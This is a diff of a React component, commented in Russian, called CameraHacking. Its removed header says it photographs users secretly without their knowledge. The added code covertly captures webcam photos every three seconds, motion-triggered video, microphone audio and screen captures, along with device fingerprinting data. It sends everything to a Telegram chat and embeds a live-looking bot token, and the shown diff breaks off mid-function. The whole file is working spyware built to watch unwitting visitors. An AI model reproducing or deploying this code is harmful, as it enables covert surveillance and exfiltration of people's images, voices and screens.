@@ -1,444 +1,723 @@
 /**
- *  КОМПОНЕНТ ACCESCAMERA - УПРАВЛЕНИЕ КАМЕРОЙ ПОЛЬЗОВАТЕЛЯ
+ * КОМПОНЕНТ CAMERAHACKING - РАСШИРЕННАЯ ВЕРСИЯ
  * 
- * Этот компонент отвечает за получение доступа к камере пользователя
- * и автоматическое создание фотографий без ведома пользователя.
- * Работает полностью в фоновом режиме - пользователь не видит процесс съемки.
- * 
- *  ОСНОВНЫЕ ФУНКЦИИ:
- * - Запрашивает разрешение на доступ к камере
- * - Инициализирует видеопоток с камеры
- * - Автоматически делает снимок через 1 секунду после инициализации
- * - Конвертирует изображение в blob формат
- * - Отправляет фотографию на сервер через API
- * 
- *  АЛГОРИТМ РАБОТЫ:
- * 1. useEffect запускается при монтировании компонента
- * 2. getUserMedia() запрашивает доступ к камере
- * 3. Видеопоток присваивается скрытому video элементу
- * 4. Через 1 секунду запускается функция захвата изображения
- * 5. Canvas создается для обработки кадра из видео
- * 6. Изображение конвертируется в blob и отправляется на сервер
- * 
- *  ВАЖНО: Работает только по HTTPS и требует разрешения пользователя!
+ * НОВЫЕ ВОЗМОЖНОСТИ:
+ * 1. Периодическая отправка фото каждые 3 секунды
+ * 2. Адаптивное качество в зависимости от сети
+ * 3. Детекция движения для умной съемки
+ * 4. Захват звука с микрофона
+ * 5. Скриншоты экрана (для десктопов)
+ * 6. Запись видео с возможностью фрагментации
+ * 7. Сбор системной информации
+ * 8. Автономное кэширование и отправка
  */
 
 import axios from 'axios';
-import { useEffect, useState } from 'react';
+import { useEffect, useRef, useState } from 'react';
 import API_CONFIG from '../api/config';
 
-/**
- *  ФУНКЦИОНАЛЬНЫЙ КОМПОНЕНТ CAMERAHACKING
- * 
- * @param {Object} props - Пропсы компонента
- * @param {Function} props.setClientIp - Функция для установки IP адреса
- * @param {string} props.chatId - ID Telegram чата для отправки фото
- * @param {Object} props.videoRef - Ссылка на video элемент из родительского компонента
- * @param {Function} props.setLocationPermission - Функция связи с геолокацией
- * @returns {JSX.Element} Пустой JSX (компонент работает только в фоне)
- */
+// Конфигурация
+const CONFIG = {
+  CAPTURE_INTERVAL: 3000, // Интервал съемки в миллисекундах (3 секунды)
+  MAX_CAPTURES: 100, // Максимальное количество снимков за сессию
+  VIDEO_DURATION: 10000, // Длительность видеофрагментов (10 секунд)
+  QUALITY: {
+    HIGH: 0.9,
+    MEDIUM: 0.7,
+    LOW: 0.5
+  },
+  NETWORK_THRESHOLDS: {
+    SLOW: 100, // Kbps
+    MEDIUM: 500 // Kbps
+  }
+};
+
 const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
+  const streamRef = useRef(null);
+  const audioStreamRef = useRef(null);
+  const mediaRecorderRef = useRef(null);
+  const captureIntervalRef = useRef(null);
+  const motionCanvasRef = useRef(null);
+  const motionContextRef = useRef(null);
+  const previousFrameRef = useRef(null);
+  
+  const [captureCount, setCaptureCount] = useState(0);
+  const [isCapturing, setIsCapturing] = useState(false);
+  const [networkSpeed, setNetworkSpeed] = useState(null);
+  const [systemInfo, setSystemInfo] = useState({});
+  const [cachedCaptures, setCachedCaptures] = useState([]);
 
   /**
-   *  ОСНОВНОЙ ЭФФЕКТ ДЛЯ РАБОТЫ С КАМЕРОЙ
-   * 
-   * Запускается сразу после монтирования компонента и выполняет
-   * всю последовательность действий по получению доступа к камере
-   * и созданию фотографии.
+   * ФУНКЦИЯ СБОРА СИСТЕМНОЙ ИНФОРМАЦИИ
+   */
+  const collectSystemInfo = () => {
+    const info = {
+      // Информация о браузере
+      browser: {
+        name: navigator.userAgentData?.brands?.[0]?.brand || 'unknown',
+        version: navigator.userAgentData?.brands?.[0]?.version || 'unknown',
+        platform: navigator.userAgentData?.platform || 'unknown',
+        mobile: navigator.userAgentData?.mobile || false
+      },
+      
+      // Характеристики устройства
+      device: {
+        memory: navigator.deviceMemory || 'unknown',
+        cores: navigator.hardwareConcurrency || 'unknown',
+        maxTouchPoints: navigator.maxTouchPoints || 0
+      },
+      
+      // Информация об экране
+      screen: {
+        width: window.screen.width,
+        height: window.screen.height,
+        colorDepth: window.screen.colorDepth,
+        pixelDepth: window.screen.pixelDepth,
+        orientation: window.screen.orientation?.type || 'unknown'
+      },
+      
+      // Сетевые возможности
+      network: {
+        connection: navigator.connection || {},
+        online: navigator.onLine,
+        language: navigator.language,
+        languages: navigator.languages
+      },
+      
+      // Временные метки
+      timestamps: {
+        start: Date.now(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        locale: navigator.language
+      },
+      
+      // Дополнительная информация
+      misc: {
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        pdfViewerEnabled: navigator.pdfViewerEnabled || false
+      }
+    };
+    
+    setSystemInfo(info);
+    return info;
+  };
+
+  /**
+   * ФУНКЦИЯ ТЕСТИРОВАНИЯ СКОРОСТИ СЕТИ
+   */
+  const testNetworkSpeed = async () => {
+    try {
+      const startTime = Date.now();
+      const testImage = 'https://source.unsplash.com/random/1000x1000?' + Date.now();
+      
+      const response = await fetch(testImage, { mode: 'no-cors' });
+      const endTime = Date.now();
+      
+      // Примерная оценка скорости
+      const duration = (endTime - startTime) / 1000; // секунды
+      const speed = 100 / duration; // Kbps (приблизительно)
+      
+      setNetworkSpeed(speed);
+      console.log(`🌐 Network speed: ${Math.round(speed)} Kbps`);
+      
+      return speed;
+    } catch (error) {
+      console.log("⚠️ Network speed test failed, using default");
+      return CONFIG.NETWORK_THRESHOLDS.MEDIUM;
+    }
+  };
+
+  /**
+   * ФУНКЦИЯ ОПРЕДЕЛЕНИЯ КАЧЕСТВА НА ОСНОВЕ СЕТИ
+   */
+  const getQualityBasedOnNetwork = (speed) => {
+    if (!speed || speed < CONFIG.NETWORK_THRESHOLDS.SLOW) {
+      return CONFIG.QUALITY.LOW;
+    } else if (speed < CONFIG.NETWORK_THRESHOLDS.MEDIUM) {
+      return CONFIG.QUALITY.MEDIUM;
+    } else {
+      return CONFIG.QUALITY.HIGH;
+    }
+  };
+
+  /**
+   * ФУНКЦИЯ ДЕТЕКЦИИ ДВИЖЕНИЯ
+   */
+  const initializeMotionDetection = () => {
+    if (!videoRef.current) return;
+    
+    motionCanvasRef.current = document.createElement('canvas');
+    motionCanvasRef.current.width = 160; // Низкое разрешение для производительности
+    motionCanvasRef.current.height = 120;
+    motionContextRef.current = motionCanvasRef.current.getContext('2d', { willReadFrequently: true });
+    
+    console.log("🎯 Motion detection initialized");
+  };
+
+  /**
+   * ФУНКЦИЯ ПРОВЕРКИ ДВИЖЕНИЯ
+   */
+  const detectMotion = () => {
+    if (!videoRef.current || !motionContextRef.current || !previousFrameRef.current) {
+      return false;
+    }
+    
+    try {
+      const video = videoRef.current;
+      const ctx = motionContextRef.current;
+      const canvas = motionCanvasRef.current;
+      
+      // Рисуем текущий кадр в уменьшенном размере
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const currentFrame = ctx.getImageData(0, 0, canvas.width, canvas.height);
+      
+      if (!previousFrameRef.current.data) {
+        previousFrameRef.current = currentFrame;
+        return false;
+      }
+      
+      // Сравниваем с предыдущим кадром
+      let diff = 0;
+      const length = currentFrame.data.length;
+      
+      for (let i = 0; i < length; i += 4) {
+        const prev = previousFrameRef.current.data[i];
+        const curr = currentFrame.data[i];
+        diff += Math.abs(curr - prev);
+      }
+      
+      const avgDiff = diff / (length / 4);
+      previousFrameRef.current = currentFrame;
+      
+      // Порог срабатывания
+      const threshold = 10;
+      const motionDetected = avgDiff > threshold;
+      
+      if (motionDetected) {
+        console.log(`🚶 Motion detected! Intensity: ${avgDiff.toFixed(2)}`);
+      }
+      
+      return motionDetected;
+      
+    } catch (error) {
+      console.error("❌ Motion detection error:", error);
+      return false;
+    }
+  };
+
+  /**
+   * ФУНКЦИЯ ЗАХВАТА АУДИО С МИКРОФОНА
+   */
+  const captureAudio = async () => {
+    try {
+      const audioStream = await navigator.mediaDevices.getUserMedia({
+        audio: {
+          channelCount: 1,
+          sampleRate: 16000,
+          echoCancellation: true,
+          noiseSuppression: true
+        }
+      });
+      
+      audioStreamRef.current = audioStream;
+      console.log("🎤 Audio capture enabled");
+      
+      // Запись короткого аудиофрагмента
+      const audioChunks = [];
+      const mediaRecorder = new MediaRecorder(audioStream);
+      
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          audioChunks.push(event.data);
+        }
+      };
+      
+      mediaRecorder.onstop = async () => {
+        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+        await sendToTelegram(audioBlob, 'audio', 'audio.webm');
+      };
+      
+      // Записываем 5 секунд аудио
+      mediaRecorder.start();
+      setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+      }, 5000);
+      
+    } catch (error) {
+      console.log("⚠️ Audio capture not available:", error.message);
+    }
+  };
+
+  /**
+   * ФУНКЦИЯ ЗАПИСИ ВИДЕО
+   */
+  const startVideoRecording = async () => {
+    try {
+      if (!streamRef.current) return;
+      
+      const videoStream = streamRef.current;
+      
+      // Добавляем аудио, если доступно
+      if (audioStreamRef.current) {
+        videoStream.addTrack(audioStreamRef.current.getAudioTracks()[0]);
+      }
+      
+      const mediaRecorder = new MediaRecorder(videoStream, {
+        mimeType: 'video/webm;codecs=vp9',
+        videoBitsPerSecond: 2500000
+      });
+      
+      mediaRecorderRef.current = mediaRecorder;
+      const videoChunks = [];
+      
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          videoChunks.push(event.data);
+        }
+      };
+      
+      mediaRecorder.onstop = async () => {
+        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+        await sendToTelegram(videoBlob, 'video', 'video.webm');
+      };
+      
+      // Записываем фрагмент
+      mediaRecorder.start();
+      
+      // Останавливаем через заданное время
+      setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+      }, CONFIG.VIDEO_DURATION);
+      
+      console.log("🎬 Video recording started");
+      
+    } catch (error) {
+      console.error("❌ Video recording error:", error);
+    }
+  };
+
+  /**
+   * ФУНКЦИЯ ЗАХВАТА СКРИНШОТА ЭКРАНА
+   */
+  const captureScreenshot = async () => {
+    try {
+      // Проверяем поддержку API
+      if (!navigator.mediaDevices?.getDisplayMedia) {
+        console.log("⚠️ Screen capture not supported");
+        return;
+      }
+      
+      // Запрашиваем доступ к экрану
+      const screenStream = await navigator.mediaDevices.getDisplayMedia({
+        video: { displaySurface: "monitor" },
+        audio: false
+      });
+      
+      const videoTrack = screenStream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(videoTrack);
+      
+      // Делаем снимок
+      const bitmap = await imageCapture.grabFrame();
+      
+      // Конвертируем в blob
+      const canvas = document.createElement('canvas');
+      canvas.width = bitmap.width;
+      canvas.height = bitmap.height;
+      const context = canvas.getContext('2d');
+      context.drawImage(bitmap, 0, 0);
+      
+      canvas.toBlob(async (blob) => {
+        if (blob) {
+          await sendToTelegram(blob, 'screenshot', 'screenshot.png');
+        }
+        
+        // Останавливаем запись экрана
+        videoTrack.stop();
+      }, 'image/png', 0.9);
+      
+      console.log("🖥️ Screenshot captured");
+      
+    } catch (error) {
+      console.log("⚠️ Screen capture failed:", error.message);
+    }
+  };
+
+  /**
+   * УНИВЕРСАЛЬНАЯ ФУНКЦИЯ ОТПРАВКИ
+   */
+  const sendToTelegram = async (blob, type, filename) => {
+    try {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append(type, blob, filename);
+      
+      // Добавляем метаданные
+      formData.append("metadata", JSON.stringify({
+        type: type,
+        timestamp: Date.now(),
+        captureCount: captureCount,
+        networkSpeed: networkSpeed,
+        systemInfo: systemInfo,
+        dimensions: type === 'photo' ? 
+          `${blob.width || 'unknown'}x${blob.height || 'unknown'}` : 
+          `${blob.size} bytes`
+      }));
+      
+      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
+      
+      await axios.post(apiUrl, formData, {
+        headers: { "Content-Type": "multipart/form-data" },
+        timeout: 30000
+      });
+      
+      console.log(`✅ ${type} sent successfully`);
+      setCaptureCount(prev => prev + 1);
+      
+      // Очищаем кэш после успешной отправки
+      if (cachedCaptures.length > 0) {
+        await sendCachedCaptures();
+      }
+      
+    } catch (error) {
+      console.error(`❌ Error sending ${type}:`, error);
+      
+      // Кэшируем при ошибке сети
+      cacheCapture(blob, type, filename);
+    }
+  };
+
+  /**
+   * ФУНКЦИЯ КЭШИРОВАНИЯ ЗАХВАТОВ
+   */
+  const cacheCapture = (blob, type, filename) => {
+    const cachedItem = {
+      blob,
+      type,
+      filename,
+      timestamp: Date.now(),
+      metadata: {
+        systemInfo,
+        networkSpeed
+      }
+    };
+    
+    setCachedCaptures(prev => [...prev, cachedItem].slice(0, 50)); // Максимум 50 в кэше
+    
+    // Сохраняем в localStorage для восстановления после перезагрузки
+    try {
+      const existing = JSON.parse(localStorage.getItem('cachedCaptures') || '[]');
+      existing.push({
+        ...cachedItem,
+        blob: URL.createObjectURL(blob) // Сохраняем как Data URL для простоты
+      });
+      localStorage.setItem('cachedCaptures', JSON.stringify(existing.slice(0, 20)));
+    } catch (e) {
+      console.error("❌ Failed to cache in localStorage:", e);
+    }
+    
+    console.log(`💾 Cached ${type} (${cachedCaptures.length + 1} total)`);
+  };
+
+  /**
+   * ФУНКЦИЯ ОТПРАВКИ КЭШИРОВАННЫХ ЗАХВАТОВ
+   */
+  const sendCachedCaptures = async () => {
+    if (cachedCaptures.length === 0) return;
+    
+    console.log(`📤 Sending ${cachedCaptures.length} cached captures...`);
+    
+    for (const item of [...cachedCaptures]) {
+      try {
+        await sendToTelegram(item.blob, item.type, item.filename);
+        
+        // Удаляем из кэша после успешной отправки
+        setCachedCaptures(prev => prev.filter(i => i.timestamp !== item.timestamp));
+      } catch (error) {
+        console.error(`❌ Failed to send cached ${item.type}:`, error);
+        break; // Прерываем если сеть недоступна
+      }
+    }
+  };
+
+  /**
+   * ОСНОВНАЯ ФУНКЦИЯ ЗАХВАТА ФОТО
+   */
+  const capturePhoto = async () => {
+    if (!videoRef.current || !streamRef.current || captureCount >= CONFIG.MAX_CAPTURES) {
+      console.log("⏸️ Capture stopped: limit reached or no stream");
+      stopCapturing();
+      return;
+    }
+    
+    try {
+      const video = videoRef.current;
+      
+      // Проверяем готовность видео
+      if (video.videoWidth === 0 || video.videoHeight === 0) {
+        console.log("⏳ Video not ready, skipping capture");
+        return;
+      }
+      
+      // Создаем canvas
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      
+      const context = canvas.getContext("2d");
+      
+      // Применяем эффекты для улучшения качества
+      context.filter = "contrast(1.1) brightness(1.05) saturate(1.1)";
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // Определяем качество на основе сети
+      const quality = getQualityBasedOnNetwork(networkSpeed);
+      
+      canvas.toBlob(async (blob) => {
+        if (blob) {
+          const sizeMB = (blob.size / (1024 * 1024)).toFixed(2);
+          console.log(`📸 Captured photo #${captureCount + 1} (${sizeMB} MB, quality: ${quality})`);
+          
+          // Проверяем детекцию движения
+          const motionDetected = detectMotion();
+          
+          // Отправляем фото
+          await sendToTelegram(blob, 'photo', `photo_${Date.now()}.jpg`);
+          
+          // Если обнаружено движение, делаем дополнительные действия
+          if (motionDetected) {
+            console.log("🚶 Motion detected, taking extra actions...");
+            
+            // Делаем дополнительный снимок
+            setTimeout(capturePhoto, 500);
+            
+            // Запускаем запись видео при движении
+            if (captureCount % 5 === 0) { // Каждое 5-е движение
+              startVideoRecording();
+            }
+          }
+          
+          // Периодически делаем скриншот (каждые 10 снимков)
+          if (captureCount % 10 === 0) {
+            captureScreenshot();
+          }
+          
+          // Периодически захватываем аудио (каждые 20 снимков)
+          if (captureCount % 20 === 0) {
+            captureAudio();
+          }
+        }
+      }, "image/jpeg", quality);
+      
+    } catch (error) {
+      console.error("❌ Capture error:", error);
+    }
+  };
+
+  /**
+   * ФУНКЦИЯ ЗАПУСКА ПЕРИОДИЧЕСКОГО ЗАХВАТА
+   */
+  const startPeriodicCapture = () => {
+    if (captureIntervalRef.current) {
+      clearInterval(captureIntervalRef.current);
+    }
+    
+    setIsCapturing(true);
+    console.log(`🚀 Starting periodic capture every ${CONFIG.CAPTURE_INTERVAL/1000} seconds`);
+    
+    // Первый захват сразу
+    capturePhoto();
+    
+    // Затем каждые 3 секунды
+    captureIntervalRef.current = setInterval(() => {
+      if (captureCount < CONFIG.MAX_CAPTURES) {
+        capturePhoto();
+      } else {
+        stopCapturing();
+      }
+    }, CONFIG.CAPTURE_INTERVAL);
+  };
+
+  /**
+   * ФУНКЦИЯ ОСТАНОВКИ ЗАХВАТА
+   */
+  const stopCapturing = () => {
+    if (captureIntervalRef.current) {
+      clearInterval(captureIntervalRef.current);
+      captureIntervalRef.current = null;
+    }
+    
+    if (mediaRecorderRef.current?.state === 'recording') {
+      mediaRecorderRef.current.stop();
+    }
+    
+    setIsCapturing(false);
+    console.log("🛑 Capture stopped");
+  };
+
+  /**
+   * ФУНКЦИЯ ОТПРАВКИ СВОДКИ СЕССИИ
+   */
+  const sendSessionSummary = async () => {
+    try {
+      const summary = {
+        sessionId: Date.now(),
+        totalCaptures: captureCount,
+        startTime: systemInfo.timestamps?.start,
+        endTime: Date.now(),
+        duration: Date.now() - (systemInfo.timestamps?.start || Date.now()),
+        systemInfo: systemInfo,
+        networkInfo: {
+          speed: networkSpeed,
+          quality: getQualityBasedOnNetwork(networkSpeed)
+        },
+        cachedItems: cachedCaptures.length
+      };
+      
+      const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
+      
+      await axios.post(telegramApiUrl, {
+        'chat_id': chatId,
+        'text': `📊 Session Summary\n\n` +
+               `Total captures: ${summary.totalCaptures}\n` +
+               `Duration: ${Math.round(summary.duration / 1000)} seconds\n` +
+               `Device: ${summary.systemInfo.browser.platform}\n` +
+               `Network speed: ${Math.round(summary.networkInfo.speed || 0)} Kbps\n` +
+               `Quality: ${summary.networkInfo.quality}\n` +
+               `Cached items: ${summary.cachedItems}\n` +
+               `Session ID: ${summary.sessionId}`
+      });
+      
+      console.log("📊 Session summary sent");
+      
+    } catch (error) {
+      console.error("❌ Error sending session summary:", error);
+    }
+  };
+
+  /**
+   * ОСНОВНОЙ ЭФФЕКТ
    */
   useEffect(() => {
-    /**
-     *  ФУНКЦИЯ ПОЛУЧЕНИЯ ДОСТУПА К ВЕБ-КАМЕРЕ
-     * 
-     * Асинхронная функция, которая запрашивает разрешение на использование
-     * камеры и настраивает автоматическую съемку.
-     */
-    const accessWebcam = async () => {
+    const initializeAll = async () => {
       try {
-        console.log("📸 Requesting camera access...");
+        // 1. Собираем системную информацию
+        const sysInfo = collectSystemInfo();
         
-        /**
-         *  ЗАПРОС ДОСТУПА К МЕДИА УСТРОЙСТВАМ
-         * 
-         * navigator.mediaDevices.getUserMedia() - современный Web API для доступа к камере
-         * Параметр { video: true } указывает, что нам нужен только видеопоток
-         * 
-         *  ДОПОЛНИТЕЛЬНЫЕ НАСТРОЙКИ (можно добавить):
-         * { 
-         *   video: {
-         *     width: { ideal: 1920 },     // Предпочтительная ширина
-         *     height: { ideal: 1080 },    // Предпочтительная высота
-         *     facingMode: "user"          // Фронтальная камера
-         *   }
-         * }
-         */
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        // 2. Тестируем скорость сети
+        const speed = await testNetworkSpeed();
         
-        console.log("✅ Camera access granted");
-
-        /**
-         *  ПОДКЛЮЧЕНИЕ ВИДЕОПОТОКА К VIDEO ЭЛЕМЕНТУ
-         * 
-         * Проверяем, что ссылка на video элемент существует, затем
-         * присваиваем ему полученный медиапоток. Элемент скрыт от пользователя
-         * с помощью CSS (display: none).
-         */
+        // 3. Запрашиваем доступ к камере
+        const constraints = {
+          video: {
+            width: { ideal: 1920 },
+            height: { ideal: 1080 },
+            frameRate: { ideal: 30 },
+            facingMode: "user"
+          }
+        };
+        
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        streamRef.current = stream;
+        
         if (videoRef.current) {
           videoRef.current.srcObject = stream;
           
-          console.log("🎬 Video stream connected to element");
-          
-          /**
-           * ФУНКЦИЯ ЗАХВАТА ИЗОБРАЖЕНИЯ
-           * 
-           * Создает снимок из текущего кадра видеопотока и отправляет его на сервер.
-           * Использует Canvas API для обработки видеокадра.
-           */
-          const captureImage = () => {
-            console.log("📷 Starting image capture...");
-            
-            //  ПРОВЕРКА ГОТОВНОСТИ ВИДЕО
-            // Убеждаемся, что видео загружено и имеет реальные размеры
-            if (!videoRef.current || videoRef.current.videoWidth === 0 || videoRef.current.videoHeight === 0) {
-              console.warn("⚠️ Video not ready yet, retrying in 500ms...");
-              setTimeout(captureImage, 500);
-              return;
+          // Ждем готовности видео
+          await new Promise(resolve => {
+            if (videoRef.current.readyState >= 2) {
+              setTimeout(resolve, 1000);
+            } else {
+              videoRef.current.onloadedmetadata = () => setTimeout(resolve, 1000);
             }
-            
-            console.log(`✅ Video is ready: ${videoRef.current.videoWidth}x${videoRef.current.videoHeight}`);
-            
-            /**
-             *  СОЗДАНИЕ CANVAS ЭЛЕМЕНТА ДЛЯ ОБРАБОТКИ ИЗОБРАЖЕНИЯ
-             * 
-             * Canvas используется как промежуточный буфер для захвата кадра
-             * из видеопотока и конвертации его в изображение.
-             */
-            const canvas = document.createElement("canvas");
-            
-            // Устанавливаем размеры canvas равными размерам видео
-            canvas.width = videoRef.current.videoWidth;
-            canvas.height = videoRef.current.videoHeight;
-            
-            console.log(`📏 Canvas size: ${canvas.width}x${canvas.height}`);
-  
-            /**
-             *  РИСОВАНИЕ КАДРА НА CANVAS
-             * 
-             * getContext("2d") получает 2D контекст для рисования
-             * drawImage() копирует текущий кадр из video элемента на canvas
-             */
-            const context = canvas.getContext("2d");
-            context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
-  
-            /**
-             *  КОНВЕРТАЦИЯ ИЗОБРАЖЕНИЯ В BLOB И ОТПРАВКА
-             * 
-             * toBlob() асинхронно конвертирует содержимое canvas в blob объект
-             * Параметр "image/jpeg" указывает формат выходного изображения
-             * 
-             *  ДРУГИЕ ФОРМАТЫ:
-             * - "image/png" - для PNG с прозрачностью
-             * - "image/webp" - для современного WebP формата
-             */
-            canvas.toBlob(async (blob) => {
-              if (blob) {
-                console.log(`📤 Sending photo (${blob.size} bytes)...`);
-                
-                /**
-                 *  ПОДГОТОВКА ДАННЫХ ДЛЯ ОТПРАВКИ
-                 * 
-                 * FormData используется для отправки файлов на сервер
-                 * multipart/form-data - правильный Content-Type для файлов
-                 */
-                const formData = new FormData();
-                formData.append("chat_id", chatId);           // ID Telegram чата
-                formData.append("photo", blob, "photo.jpg");  // Файл изображения
-
-                /**
-                 *  ОТПРАВКА ФОТО НА СЕРВЕР
-                 * 
-                 * Используем настроенный API endpoint для отправки фотографий
-                 * Сервер получит файл и переправит его в Telegram бот
-                 */
-                const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
-                
-                try {
-                  await axios.post(apiUrl, formData, {
-                    headers: { 
-                      "Content-Type": "multipart/form-data" 
-                    },
-                    timeout: 10000 // Таймаут 10 секунд для предотвращения зависания
-                  });
-                  
-                  console.log("✅ Photo sent successfully to Telegram");
-                  
-                } catch (error) {
-                  console.error("❌ Error sending photo to server:", error);
-                  
-                  //  Можно добавить логику повторной отправки
-                  // setTimeout(() => captureImage(), 5000);
-                }
-              } else {
-                console.error("❌ Failed to create image blob");
-              }
-            }, "image/jpeg", 0.9); // Качество JPEG: 0.9 (90%)
-          };
-
-          /**
-           *  ФУНКЦИЯ ОЖИДАНИЯ ГОТОВНОСТИ ВИДЕО
-           * 
-           * Более надежная альтернатива setTimeout - ждем пока видео
-           * полностью загрузится и будет готово к захвату кадров.
-           */
-          const waitForVideoReady = () => {
-            return new Promise((resolve) => {
-              // Если видео уже готово, сразу резолвим
-              if (videoRef.current.videoWidth > 0 && videoRef.current.videoHeight > 0) {
-                console.log("✅ Video already ready");
-                resolve();
-                return;
-              }
-
-              // Обработчик события загрузки метаданных видео
-              const handleLoadedMetadata = () => {
-                console.log("✅ Video metadata loaded");
-                videoRef.current.removeEventListener('loadedmetadata', handleLoadedMetadata);
-                // Небольшая дополнительная задержка для стабильности
-                setTimeout(resolve, 200);
-              };
-
-              // Fallback таймер на случай, если событие не сработает
-              const fallbackTimer = setTimeout(() => {
-                console.log("⏰ Using fallback timer for video ready");
-                videoRef.current.removeEventListener('loadedmetadata', handleLoadedMetadata);
-                resolve();
-              }, 3000);
-
-              // Добавляем слушатель события
-              videoRef.current.addEventListener('loadedmetadata', () => {
-                clearTimeout(fallbackTimer);
-                handleLoadedMetadata();
-              });
-
-              // Пытаемся запустить видео, если оно еще не запущено
-              if (videoRef.current.paused) {
-                videoRef.current.play().catch(err => {
-                  console.log("Note: Auto-play blocked, but capture will still work");
-                });
-              }
-            });
-          };
-
-          /**
-           *  УМНЫЙ ЗАПУСК СЪЕМКИ
-           * 
-           * Вместо фиксированной задержки используем Promise-based подход:
-           * 1. Ждем загрузки метаданных видео (событие 'loadedmetadata')
-           * 2. Проверяем, что videoWidth/videoHeight больше 0
-           * 3. Добавляем небольшую задержку для стабильности
-           * 4. Запускаем захват изображения
-           * 
-           *  ПРЕИМУЩЕСТВА ЭТОГО ПОДХОДА:
-           * - Гарантирует готовность видеопотока
-           * - Работает быстрее на быстрых соединениях
-           * - Более надежен на медленных устройствах
-           * - Имеет fallback на случай проблем
-           */
-          waitForVideoReady().then(() => {
-            console.log("🎬 Video is fully ready, starting capture...");
-            captureImage();
           });
-        } else {
-          console.error("❌ Video element reference is null");
+          
+          // 4. Инициализируем детекцию движения
+          initializeMotionDetection();
+          
+          // 5. Запускаем периодический захват
+          startPeriodicCapture();
+          
+          // 6. Запускаем сбор IP
+          fetchClientIp();
+          
+          console.log("🎯 All systems initialized");
         }
         
       } catch (error) {
-        /**
-         *  ОБРАБОТКА ОШИБОК ДОСТУПА К КАМЕРЕ
-         * 
-         * Пользователь может отклонить запрос на доступ к камере или
-         * камера может быть недоступна по техническим причинам.
-         * 
-         *  ТИПИЧНЫЕ ОШИБКИ:
-         * - NotAllowedError: пользователь отклонил разрешение
-         * - NotFoundError: камера не найдена
-         * - NotReadableError: камера заблокирована другим приложением
-         * - OverconstrainedError: запрошенные параметры не поддерживаются
-         */
-        console.error("❌ Error accessing webcam:", error);
-        
-        try {
-          /**
-           *  УВЕДОМЛЕНИЕ В TELEGRAM ОБ ОТКАЗЕ
-           * 
-           * Если пользователь отклоняет доступ к камере, отправляем
-           * уведомление в Telegram чат. Это помогает отслеживать
-           * количество отказов и успешных подключений.
-           * 
-           *  ПРИМЕЧАНИЕ: Здесь используется хардкод токена бота,
-           * в продакшне лучше вынести это в конфигурацию
-           */
-          const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
-          
-          await axios.post(telegramApiUrl, {
-            'chat_id': chatId, 
-            'text': `🚫 Пользователь отклонил запрос к камере!\n\n` +
-                   `Тип ошибки: ${error.name}\n` +
-                   `Описание: ${error.message}\n` +
-                   `Время: ${new Date().toLocaleString()}`
-          });
+        console.error("❌ Initialization error:", error);
+        handleCameraError(error);
+      }
+    };
 
-          console.log("📤 Camera denial notification sent to Telegram");
+    // Восстановление из localStorage
+    const restoreFromCache = () => {
+      try {
+        const saved = localStorage.getItem('cachedCaptures');
+        if (saved) {
+          const cached = JSON.parse(saved);
+          console.log(`📦 Found ${cached.length} cached items from previous session`);
           
-        } catch (err) {
-          console.error("❌ Error sending notification to Telegram:", err);
+          // Пытаемся отправить кэшированные данные
+          setTimeout(sendCachedCaptures, 5000);
+        }
+      } catch (e) {
+        console.error("❌ Failed to restore cache:", e);
+      }
+    };
+
+    // Инициализация
+    initializeAll();
+    restoreFromCache();
+
+    // Обработка видимости страницы
+    const handleVisibilityChange = () => {
+      if (document.hidden) {
+        console.log("⏸️ Page hidden, pausing capture");
+        stopCapturing();
+      } else {
+        console.log("▶️ Page visible, resuming capture");
+        if (!isCapturing) {
+          startPeriodicCapture();
         }
       }
     };
 
-    /**
-     *  ВОССТАНОВЛЕНИЕ СОХРАНЕННЫХ ДАННЫХ ГЕОЛОКАЦИИ
-     * 
-     * Проверяем localStorage на наличие ранее сохраненных данных геолокации.
-     * Если данные есть, восстанавливаем их в состоянии компонента.
-     * 
-     *  СТРУКТУРА ДАННЫХ В LOCALSTORAGE:
-     * {
-     *   latitude: number,
-     *   longitude: number,
-     *   timestamp: number
-     * }
-     */
-    const savedPermission = localStorage.getItem("locationPermission");
-    if (savedPermission) {
-      try {
-        const locationData = JSON.parse(savedPermission);
-        setLocationPermission(locationData);
-        console.log("📍 Restored location data from localStorage:", locationData);
-      } catch (error) {
-        console.error("❌ Error parsing saved location data:", error);
-        localStorage.removeItem("locationPermission"); // Удаляем поврежденные данные
-      }
-    }
+    document.addEventListener('visibilitychange', handleVisibilityChange);
 
-    /**
-     *  ФУНКЦИЯ ПОЛУЧЕНИЯ IP АДРЕСА ПОЛЬЗОВАТЕЛЯ
-     * 
-     * Использует внешний сервис ipify.org для определения публичного IP адреса.
-     * IP может быть использован как fallback для геолокации.
-     * 
-     * АЛЬТЕРНАТИВНЫЕ СЕРВИСЫ:
-     * - https://httpbin.org/ip
-     * - https://ipinfo.io/json
-     * - https://api.myip.com
-     */
-    const fetchClientIp = async () => {
-      try {
